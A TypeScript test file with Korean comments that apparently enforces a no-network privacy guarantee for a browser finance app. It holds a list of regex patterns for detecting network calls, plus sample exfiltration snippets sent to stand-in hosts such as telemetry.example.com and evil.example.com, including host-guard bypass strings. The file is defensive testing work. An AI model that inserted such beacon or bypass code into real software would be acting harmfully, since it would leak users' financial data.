import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";

/**
 * 이 제품의 약속은 "재무정보가 네트워크를 탈 경로가 코드상 존재하지 않는다"이다.
 * 설정이 아니라 구조로 보장되어야 하므로 소스를 직접 훑어 확인한다.
 *
 * 이 테스트만은 fs를 쓴다 — 순수 함수 규칙의 의도적 예외다.
 *
 * **이 배열이 이 제품의 privacy 약속을 지키는 유일한 구조적 장치다.** 과거
 * 버전은 `fetch(`, `XMLHttpRequest`, `WebSocket`, `navigator.sendBeacon`,
 * `https?://`만 잡았는데, 리뷰어가 스크래치 사본에 아래 7개의 실제 유출
 * 경로를 심었더니 전부 통과했다:
 *
 *   1. `export const FONT = "//fonts.googleapis.com/css2?family=Noto+Sans+KR";`
 *   2. `const img = new Image(); img.src = "//telemetry.example.com/collect?d=" + data;`
 *   3. `const f = globalThis.fetch; return f("/api/log", { method: "POST", body });`
 *   4. `return import(/* @vite-ignore *\/ url);`
 *   5. `export const FORM = '<form action="//evil.example.com/x" method="post">';`
 *   6. CSS `@import url(//fonts.googleapis.com/css2?family=Inter);`
 *   7. CSS `body { background: url(//cdn.example.com/bg.png); }`
 *
 * 원인은 좁은 패턴이었다: `fetch(`는 괄호를 요구해 `globalThis.fetch`처럼
 * 별칭을 거치면 빠져나가고, `https?://`는 프로토콜 상대 URL(`//host/...`,
 * CSS의 `url(//host/...)`)을 아예 보지 않았다. 아래 목록은 그 7개를 포함해
 * protocol-relative URL, `.src =` 대입, `new Image`, 동적 `import(`,
 * `navigator.sendBeacon`/`navigator.connection`, 별칭을 거친 `fetch`까지
 * 잡도록 넓혔고, `node:`/`require(`도 추가해 tsconfig.json이
 * `"types": ["node", "vite/client"]`를 갖게 되며 사라진 타입 체크 수준의
 * 방어선(Node API를 쓰면 타입 에러가 나던 것)을 이 테스트가 대신 지킨다.
 *
 * **패턴을 고치거나 추가할 때는 반드시 아래 `sample`도 그 패턴이 실제로
 * 잡아내는 최소 문자열로 채워라.** "패턴 자체를 핀 고정하는" 테스트가
 * 이 배열을 순회하며 `pattern.test(sample)`이 참인지 확인한다 — sample이
 * 없거나 패턴이 느슨해지면 그 테스트가 바로 빨갛게 죽는다. 이 핀이 없으면
 * "이 정규식이 지금도 뭔가를 잡고 있다"는 사실 자체가 다시 무인지대가 된다.
 *
 * 이 스캔은 `src/`만 본다. `scripts/pipeline/`은 의도적으로 제외돼 있다 —
 * 약속의 내용은 "사용자 재무정보가 브라우저를 벗어나지 않는다"이고,
 * 파이프라인은 **사용자 데이터를 아예 보지 않는 빌드 타임 도구**이기 때문이다.
 * 파이프라인이 `fetch`를 쓰는 것은 위반이 아니다.
 */
interface ForbiddenPattern {
  pattern: RegExp;
  /** 이 패턴이 무엇을 겨냥하는지 (핀 테스트 실패 메시지에 쓰인다) */
  label: string;
  /** 이 패턴이 반드시 걸려야 하는 최소 재현 문자열 */
  sample: string;
}

const FORBIDDEN_PATTERNS: ForbiddenPattern[] = [
  {
    label: "XMLHttpRequest",
    pattern: /XMLHttpRequest/,
    sample: "new XMLHttpRequest()",
  },
  {
    label: "WebSocket",
    pattern: /\bWebSocket\b/,
    sample: "new WebSocket('wss://x')",
  },
  {
    label: "navigator.sendBeacon / navigator.connection",
    pattern: /\bnavigator\.(sendBeacon|connection)\b/,
    sample: "navigator.sendBeacon('/collect', data)",
  },
  {
    label: "http(s):// 리터럴 (w3.org 예외)",
    pattern: /https?:\/\/(?!www\.w3\.org)/,
    sample: "https://telemetry.example.com/collect",
  },
  {
    label: "fetch (별칭을 거친 참조 포함 — 괄호 요구하지 않음)",
    pattern: /\bfetch\b/,
    // 심어졌던 실제 우회: const f = globalThis.fetch; f(...)
    sample: "const f = globalThis.fetch;",
  },
  {
    label: "프로토콜 상대 URL (//host.tld, CSS url(//host.tld) 포함)",
    pattern: /(^|[^:a-zA-Z])\/\/[a-zA-Z0-9-]+\.[a-zA-Z]{2,}/,
    sample: '"//telemetry.example.com/collect?d=1"',
  },
  {
    label: ".src = 대입 (Image 등으로 픽셀/비콘 전송)",
    pattern: /\.src\s*=/,
    sample: 'img.src = "//telemetry.example.com/x";',
  },
  {
    label: "new Image (트래킹 픽셀)",
    pattern: /new\s+Image\b/,
    sample: "const img = new Image();",
  },
  {
    label: "동적 import( (임의 URL·모듈 로드)",
    pattern: /\bimport\s*\(/,
    sample: "return import(/* @vite-ignore */ url);",
  },
  {
    label: "node: 프로토콜 임포트",
    pattern: /\bnode:/,
    sample: 'import { readFileSync } from "node:fs";',
  },
  {
    label: "require(",
    pattern: /\brequire\s*\(/,
    sample: "const fs = require('fs');",
  },
];

const FORBIDDEN = FORBIDDEN_PATTERNS.map((p) => p.pattern);

/** src 트리 안에서, 이름이 정확히 이 문자열로 끝나는 파일 경로를 모두 찾는다 */
function findByNameSuffix(dir: string, suffix: string): string[] {
  return readdirSync(dir).flatMap((entry) => {
    const path = join(dir, entry);
    if (statSync(path).isDirectory()) return findByNameSuffix(path, suffix);
    return entry.endsWith(suffix) ? [path] : [];
  });
}

function sourceFiles(dir: string): string[] {
  return readdirSync(dir).flatMap((entry) => {
    const path = join(dir, entry);
    if (statSync(path).isDirectory()) return sourceFiles(path);
    if (!/\.(ts|tsx|css|html)$/.test(entry)) return [];
    if (entry.endsWith("no-network.test.ts")) return [];
    if (entry === "regionQuery.ts") return []; // Task 4에서 추가한 유일한 fetch 예외
    // regionQuery.ts의 동작 테스트. fetch를 모킹하므로 필연적으로 "fetch"
    // 문자열을 담는다 — 실제 네트워크 호출이 아니라 그 유일한 예외를
    // 검증하는 테스트 코드다.
    if (entry === "regionQuery.test.ts") return [];
    if (entry === "loadNaverMaps.ts") return []; // 네이버지도 스크립트 삽입 — 이 태스크의 새 예외
    if (entry === "loadNaverMaps.test.ts") return [];
    return [path];
  });
}

describe("네트워크 요청 없음", () => {
  it("소스 어디에도 네트워크 호출이 없다", () => {
    const offenders: string[] = [];

    for (const file of [...sourceFiles("src"), "index.html"]) {
      const content = readFileSync(file, "utf8");
      for (const pattern of FORBIDDEN) {
        if (pattern.test(content)) {
          offenders.push(`${file}: ${pattern}`);
        }
      }
    }

    expect(offenders).toEqual([]);
  });

  it("no-network.test.ts만 스캔에서 빠지고, 그 외 파일은 하나도 빠지지 않는다", () => {
    // 이름이 정확히 "no-network.test.ts"로 끝나는 파일이 이 파일 자신
    // 말고 더 있으면(우연히 같은 접미사를 가진 다른 파일이 생기면) 그것도
    // 조용히 스캔에서 빠지게 된다. 정확히 하나(이 파일 자신)여야 한다.
    const matches = findByNameSuffix("src", "no-network.test.ts");
    expect(matches).toEqual(["src/no-network.test.ts"]);

    // 제외 목록에 없는 실제 소스 파일들은 스캔 대상에 그대로 남아 있어야
    // 한다 — exclude 조건이 과하게 넓어져 다른 파일까지 삼키지 않았는지
    // 확인한다.
    const scanned = sourceFiles("src");
    expect(scanned).toContain("src/App.tsx");
    expect(scanned).toContain("src/lib/finance/index.ts");
    expect(scanned.some((f) => f.endsWith("no-network.test.ts"))).toBe(false);
  });

  it("regionQuery.ts만 fetch 예외이고, 정확히 하나만 존재한다", () => {
    const matches = findByNameSuffix("src", "regionQuery.ts");
    expect(matches).toEqual(["src/lib/regionQuery.ts"]);
  });

  it("regionQuery.test.ts만 fetch 모킹 예외이고, 정확히 하나만 존재한다", () => {
    const matches = findByNameSuffix("src", "regionQuery.test.ts");
    expect(matches).toEqual(["src/lib/regionQuery.test.ts"]);
  });

  describe("패턴 핀 고정 — 각 정규식이 실제로 뭔가를 잡아내는지 검증", () => {
    // 정규식을 고치다 실수로 느슨해지면(예: 괄호를 다시 요구하게 되돌리면)
    // 여기서 바로 실패한다. 실제 소스 스캔 테스트만으로는 "패턴이 아무것도
    // 안 걸러도" 통과해 버리므로, 그물 자체를 이 테스트로 고정한다.
    it.each(FORBIDDEN_PATTERNS)(
      "$label 패턴은 실제 유출 코드를 잡아낸다",
      ({ pattern, sample }) => {
        expect(pattern.test(sample)).toBe(true);
      },
    );
  });

  describe("리뷰어가 심었던 7개의 실제 유출 경로 재현", () => {
    // 고치기 전 no-network.test.ts는 이 7개 스니펫이 전부 통과했다.
    const PLANTED_EXFILTRATION_SAMPLES = [
      'export const FONT = "//fonts.googleapis.com/css2?family=Noto+Sans+KR";',
      'const img = new Image(); img.src = "//telemetry.example.com/collect?d=" + data;',
      'const f = globalThis.fetch; return f("/api/log", { method: "POST", body });',
      "return import(/* @vite-ignore */ url);",
      'export const FORM = \'<form action="//evil.example.com/x" method="post">\';',
      "@import url(//fonts.googleapis.com/css2?family=Inter);",
      "body { background: url(//cdn.example.com/bg.png); }",
    ];

    it.each(PLANTED_EXFILTRATION_SAMPLES)(
      "이제는 적어도 하나의 패턴이 걸린다: %s",
      (snippet) => {
        expect(FORBIDDEN.some((pattern) => pattern.test(snippet))).toBe(true);
      },
    );
  });
});

/**
 * 파일 안의 모든 `fetch(...)` 호출에서, 인자로 **바로 적힌 문자열
 * 리터럴의 시작 부분**을 뽑는다. 따옴표·백틱 세 종류를 모두 본다.
 *
 * 뽑는 것이 "URL 전체"가 아니라 "리터럴의 앞부분"인 이유: 이 저장소의
 * 호출은 `fetch("/api/complexes?" + params)`처럼 리터럴 뒤에 값을 이어
 * 붙인다. 검사하려는 것은 **어디로 나가는가**이고 그건 리터럴의 맨
 * 앞(스킴/호스트/경로 시작)이 정한다 — 뒤에 무엇이 붙든 `/api/...`로
 * 시작하면 같은 출처의 그 경로로 간다.
 *
 * 리터럴이 아예 없는 호출(`fetch(url)`)은 두 번째 캡처가 비어 매치돼,
 * 아래 검사에서 "상대경로로 시작하지 않는다"로 걸린다 — 변수로 감싸
 * 빠져나가는 길을 열어 두지 않는다.
 */
function fetchCallLiterals(content: string): string[] {
  return [...content.matchAll(/\bfetch\s*\(\s*(?:(["'`])([^"'`]*)|([^\s"'`)]*))/g)].map(
    (m) => m[2] ?? m[3] ?? "",
  );
}

describe("regionQuery 예외", () => {
  const REGION_QUERY_PATH = "src/lib/regionQuery.ts";

  it("regionQuery.ts는 정확히 하나만 존재하고, 그 안에 재무 필드 이름이 없다", () => {
    const content = readFileSync(REGION_QUERY_PATH, "utf8");
    const FORBIDDEN_FIELD_NAMES = [
      "cash",
      "annualIncome",
      "existingDebtAnnualPayment",
      "ownedHomeCount",
      "isFirstTimeBuyer",
      "isRegulatedArea",
    ];
    // isRegulatedArea는 응답 "받는" 쪽 타입 선언에는 등장해도 된다 —
    // 여기서 막는 것은 "요청을 만드는 데 쓰였는가"이므로, 응답 타입
    // 선언까지 전부 막으면 이 파일 자체를 만들 수 없다. 그래서
    // isRegulatedArea는 이 목록에서 뺀다(요청 URL 생성부는 regionCode·
    // dong만 받는다는 사실은 아래 별도 테스트가 확인한다).
    const requestFields = FORBIDDEN_FIELD_NAMES.filter((f) => f !== "isRegulatedArea");
    for (const field of requestFields) {
      expect(content, `${field}가 regionQuery.ts에 등장하면 안 된다`).not.toContain(field);
    }
  });

  /**
   * 이 파일이 정당하게 부르는 두 엔드포인트. **둘 다 상대경로다** —
   * `loadNaverMaps.ts`와 달리 이 파일은 외부 호스트를 부를 일이 아예
   * 없으므로, 가드의 모양도 다르다: 저기서는 "허용된 origin인가"를 묻지만
   * 여기서는 "**호스트가 아예 없는가**(=상대경로인가)"를 묻는다.
   */
  const ALLOWED_ENDPOINTS = ["/api/complexes", "/api/geocode"];

  it("regionQuery.ts의 fetch는 전부 상대경로이고, 그 경로는 알려진 엔드포인트뿐이다", () => {
    const content = readFileSync(REGION_QUERY_PATH, "utf8");
    const literals = fetchCallLiterals(content);

    // 그물이 비어 있지 않은지 핀 고정 — 호출을 못 찾으면 아래 루프가
    // 통째로 공허하게 통과한다.
    expect(literals.length).toBeGreaterThan(0);

    const endpoints = new Set<string>();
    for (const literal of literals) {
      // 절대 URL(`https://host/...`)도, 프로토콜 상대 URL(`//host/...`)도
      // 안 된다. 후자는 브라우저가 `https://host/...`와 똑같이 다룬다.
      expect(literal.startsWith("/"), `fetch(${literal}…)가 상대경로가 아니다`).toBe(true);
      expect(literal.startsWith("//"), `fetch(${literal}…)가 프로토콜 상대 URL이다`).toBe(false);
      endpoints.add(literal.split("?")[0]!);
    }

    expect([...endpoints].sort()).toEqual([...ALLOWED_ENDPOINTS].sort());
  });

  it("regionQuery.ts에는 절대 URL·프로토콜 상대 URL 리터럴이 하나도 없다", () => {
    // fetch 인자만 보면 `new Image().src = "//evil.tld/x"` 같은 다른
    // 유출 경로를 놓친다. 이 파일 전체에 호스트가 붙은 URL 리터럴이
    // 하나도 없어야 한다 — 이 파일이 나갈 곳은 자기 자신의 출처뿐이다.
    const content = readFileSync(REGION_QUERY_PATH, "utf8");
    expect(urlOriginsIn(content).map(({ raw }) => raw)).toEqual([]);
  });

  it("정규식이 놓친 스킴 리터럴도 남아있으면 안 된다", () => {
    // loadNaverMaps.ts 가드와 같은 2층 구조다: 위 두 검사는 정규식이
    // 매치한 것만 본다. 문자열 접합·템플릿 보간·percent-encoding으로
    // 리터럴이 쪼개지면 정규식이 아예 매치하지 않아 검사 자체가 돌지
    // 않으므로, 정규식 도입 전의 뭉뚝한 검사를 마지막 층으로 남긴다.
    const content = readFileSync(REGION_QUERY_PATH, "utf8");
    expect(content, "스킴 리터럴이 남아 있다").not.toMatch(/https?:\/\//);
  });

  describe("가드 핀 고정 — 예전 뭉뚝한 검사가 놓쳤던 모양 재현", () => {
    // 고치기 전 가드는 `content.toContain('"/api/complexes')` +
    // `not.toMatch(/https?:\/\//)`뿐이었다. `/api/complexes`만 어딘가에
    // 있으면 그 옆에서 어디로 나가든 통과했고, `//host/...`는 스킴이
    // 없어 뭉뚝한 검사에도 안 걸렸다.
    const BYPASSES = [
      'const res = await fetch("//evil.example.com/x");',
      'const res = await fetch("https://evil.example.com/x");',
      'const res = await fetch(untrustedUrl);',
      'const res = await fetch("/api/secret-exfil");',
    ];

    it.each(BYPASSES)("이제는 잡아낸다: %s", (snippet) => {
      const literals = fetchCallLiterals(snippet);
      expect(literals.length).toBeGreaterThan(0);
      const ok = literals.every(
        (l) => l.startsWith("/") && !l.startsWith("//") && ALLOWED_ENDPOINTS.includes(l.split("?")[0]!),
      );
      expect(ok).toBe(false);
    });

    it("정당한 두 엔드포인트 호출은 통과시킨다", () => {
      const literals = fetchCallLiterals(
        'await fetch("/api/complexes?" + params.toString());\nawait fetch(`/api/geocode?${params.toString()}`);',
      );
      expect(literals.map((l) => l.split("?")[0])).toEqual(ALLOWED_ENDPOINTS);
    });
  });
});

/**
 * 파일 내용에서 절대 URL(`https://host/...`)과 프로토콜 상대 URL(`//host/...`)
 * 리터럴을 모두 뽑아 각각의 origin으로 환산한다.
 *
 * 접두어 제거(`content.replaceAll("https://oapi.map.naver.com", "")`) 방식은
 * origin 검증이 아니라 문자열 자르기였고, 리뷰어가 실제로 두 가지 우회를
 * 통과시켰다:
 *
 *   1. `"//evil.example.com/x.js"` — 지울 `https://` 접두어가 애초에 없어
 *      아무것도 지워지지 않고, 남은 문자열에도 `https?://`가 없어 통과했다.
 *      브라우저는 `//host/path`를 `https://host/path`와 똑같이 불러온다.
 *   2. `"https://oapi.map.naver.com.evil.io/steal.js"` — 정당한 URL이 이
 *      문자열의 **접두어**라서 지우고 나면 `.evil.io/steal.js`만 남고,
 *      거기엔 `https?://`가 없어 통과했다. 실제 호스트는 `evil.io`다.
 *
 * 그래서 문자열을 자르지 않고 `new URL()`로 origin을 뽑아 정확히 비교한다.
 * `//`로 시작하는 리터럴은 `https:`를 붙여 같은 규칙으로 환산한다 —
 * 브라우저 동작과 일치시키기 위해서다.
 */
function urlOriginsIn(content: string): { raw: string; origin: string }[] {
  // `[A-Za-z]{2,}` TLD를 요구해 `/// <reference ... />` 같은 주석은 걸리지 않고,
  // `[^\s"'`]*`가 따옴표·백틱에서 멈춰 템플릿 리터럴 경계를 넘지 않는다.
  const literals = content.match(/(?:https?:)?\/\/[A-Za-z0-9.-]+\.[A-Za-z]{2,}[^\s"'`]*/g) ?? [];
  return literals.map((raw) => ({
    raw,
    origin: new URL(raw.startsWith("//") ? `https:${raw}` : raw).origin,
  }));
}

describe("loadNaverMaps 예외", () => {
  const LOAD_NAVER_MAPS_PATH = "src/lib/loadNaverMaps.ts";
  const NAVER_MAPS_ORIGIN = "https://oapi.map.naver.com";

  it("loadNaverMaps.ts는 정확히 하나만 존재하고, 그 안에 재무 필드 이름이 없다", () => {
    const content = readFileSync(LOAD_NAVER_MAPS_PATH, "utf8");
    const FORBIDDEN_FIELD_NAMES = [
      "cash", "annualIncome", "existingDebtAnnualPayment",
      "ownedHomeCount", "isFirstTimeBuyer", "isRegulatedArea",
    ];
    for (const field of FORBIDDEN_FIELD_NAMES) {
      expect(content, `${field}가 loadNaverMaps.ts에 등장하면 안 된다`).not.toContain(field);
    }
  });

  it("loadNaverMaps.ts는 네이버지도 호스트 외 다른 곳으로 나가지 않는다", () => {
    const content = readFileSync(LOAD_NAVER_MAPS_PATH, "utf8");
    const urls = urlOriginsIn(content);
    // 그물이 비어 있지 않은지 핀 고정 — 파일이 바뀌어 URL 리터럴 자체가
    // 사라지면 아래 루프가 통째로 공허하게 통과한다.
    expect(urls.length).toBeGreaterThan(0);
    for (const { raw, origin } of urls) {
      expect(origin, `${raw}는 네이버지도 호스트가 아니다`).toBe(NAVER_MAPS_ORIGIN);
    }
  });

  it("정규식이 놓친 스킴 리터럴도 남아있으면 안 된다", () => {
    // urlOriginsIn의 정규식은 `https://` 뒤에 유효한 호스트+TLD가 한
    // 덩어리로 소스에 그대로 붙어 있어야 매치한다. 문자열 접합
    // (`"https://" + host + "/x.js"`), 템플릿 보간
    // (`` `https://${h}.evil.io/x.js` ``), percent-encoding
    // (`"https://evil%2Eio/x.js"`)처럼 리터럴이 쪼개지거나 인코딩되면
    // 정규식이 아예 매치하지 않아 origin 검증 자체가 실행되지 않는다 —
    // 위 테스트는 그런 리터럴을 통째로 못 본다.
    //
    // 그래서 정규식이 실제로 매치·검증한 리터럴만 파일 내용에서 지운
    // 나머지에 대해, 정규식 도입 전에 쓰던 뭉뚝한 "https?:// 가 남아있으면
    // 안 된다" 검사를 다시 건다. 정규식이 잡아낸 유일한 정당한 URL은
    // 이 시점에 이미 지워졌으므로 오탐은 없고, 정규식이 놓친 스킴
    // 리터럴은 여기서 잡힌다.
    const content = readFileSync(LOAD_NAVER_MAPS_PATH, "utf8");
    const urls = urlOriginsIn(content);
    const residual = urls.reduce((acc, { raw }) => acc.replaceAll(raw, ""), content);
    expect(residual, "정규식 그물을 빠져나간 스킴 리터럴이 남아 있다").not.toMatch(/https?:\/\//);
  });

  describe("호스트 가드 핀 고정 — 접두어 제거 방식이 놓쳤던 우회 재현", () => {
    // 고치기 전 가드(`replaceAll("https://oapi.map.naver.com", "")` 후
    // `https?://` 검사)는 아래 두 스니펫을 전부 통과시켰다.
    const HOST_GUARD_BYPASSES = [
      '"//evil.example.com/x.js"',
      '"https://oapi.map.naver.com.evil.io/steal.js"',
    ];

    it.each(HOST_GUARD_BYPASSES)(
      "이제는 네이버지도 호스트가 아니라고 잡아낸다: %s",
      (snippet) => {
        const origins = urlOriginsIn(snippet);
        expect(origins.length).toBeGreaterThan(0);
        expect(origins.every(({ origin }) => origin === NAVER_MAPS_ORIGIN)).toBe(false);
      },
    );

    it("정당한 네이버지도 스크립트 URL은 통과시킨다", () => {
      const origins = urlOriginsIn(
        "script.src = `https://oapi.map.naver.com/openapi/v3/maps.js?ncpKeyId=${x}`;",
      );
      expect(origins.map(({ origin }) => origin)).toEqual([NAVER_MAPS_ORIGIN]);
    });
  });

  it("loadNaverMaps.ts만 스크립트 삽입 예외이고, 정확히 하나만 존재한다", () => {
    const matches = findByNameSuffix("src", "loadNaverMaps.ts");
    expect(matches).toEqual(["src/lib/loadNaverMaps.ts"]);
  });

  it("loadNaverMaps.test.ts만 그 테스트 예외이고, 정확히 하나만 존재한다", () => {
    const matches = findByNameSuffix("src", "loadNaverMaps.test.ts");
    expect(matches).toEqual(["src/lib/loadNaverMaps.test.ts"]);
  });
});
